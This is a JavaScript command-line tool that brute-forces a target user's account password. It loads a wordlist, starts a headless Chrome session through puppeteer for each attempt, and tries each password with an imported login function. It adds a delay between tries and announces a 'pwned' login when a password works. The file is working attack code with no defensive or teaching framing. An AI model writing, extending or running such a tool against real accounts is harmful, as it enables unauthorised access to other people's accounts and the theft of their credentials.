import yargs from "yargs";
import fs from "fs";
import puppeteer from "puppeteer";
import { boldText, checkInternet, login } from "./utils.js";
import { redAst, yellow, red, green, pwned, warn } from "./constants.js";

const opt = yargs(process.argv.slice(2))
	.usage("\nUsage: ./index.js -t <target> -w <path/to/wordlist>")
	.option("t", {
		alias: "target",
		describe: "The target user.",
		type: "string",
		demandOption: true
	})
	.option("w", {
		alias: ["wl", "wordlist"],
		description: "The wordlist file path.",
		type: "string",
		demandOption: true
	})
	.option("exec", {
		alias: "executable",
		description: "The path to the Chrome executable.",
		type: "string",
		demandOption: false
	})
	.option("d", {
		alias: "delay",
		description: "The delay between each password attempt.",
		type: "number",
		default: 1000,
		demandOption: false
	})
	.help(true)
	.parseSync();

const main = async () => {
	const target = opt.t ?? opt.target;
	const wordlist = opt.w ?? opt.wl ?? opt.wordlist;
	const executable = opt.exec ?? opt.executable;
	const delayTime = opt.d ?? Number(opt.delay);
	const opts = [target, wordlist];
	let passwds = [];

	if (opts.some((opt) => opt !== undefined || opt !== null)) {
		if ((await checkInternet()) === false) {
			console.log(redAst + "No internet connection.");
			process.exit(1);
		}

		if (wordlist) {
			if (!fs.existsSync(wordlist)) {
				console.log(redAst + "The wordlist file does not exist.");
				process.exit(1);
			}

			passwds = fs.readFileSync(wordlist, "utf-8").split(/\r?\n/);
			const filteredPasswds = passwds.length - 1 - passwds.filter((passwd) => passwd.length > 6).length;

			console.log(yellow + `${passwds.length - 1} possible passwords loaded from ${wordlist}.`);
			console.log(warn + `${filteredPasswds} password(s) were filtered out due to their length`);

			for (let passwd of passwds) {
				if (passwd.length <= 6) continue;

				console.log(yellow + `Trying password ${boldText(passwd)}.`);

				if (executable) {
					if (!fs.existsSync(String(executable))) {
						console.log(redAst + "The specified Chrome/Chromium executable does not exist.");
						process.exit(1);
					}
				}

				const browser = await puppeteer.launch({
					executablePath: executable ? String(executable) : puppeteer.executablePath(),
					args: [
						"--disable-gpu",
						"--disable-dev-shm-usage",
						"--disable-setuid-sandbox",
						"--no-first-run",
						"--no-sandbox",
						"--no-zygote",
						"--single-process"
					]
				});

				const loginTest = login(target, passwd, browser);

				if ((await loginTest) === false) {
					console.log(red + `${passwd} is incorrect.`);
					await new Promise((resolve) => setTimeout(resolve, delayTime));
				} else {
					console.log(green + `${passwd} is correct.`);
					console.log(pwned + `Successfully logged in as ${target} with password ${boldText(passwd)}.`);

					process.exit(0);
				}

				await browser.close();
			}
		}
	}
};

main();
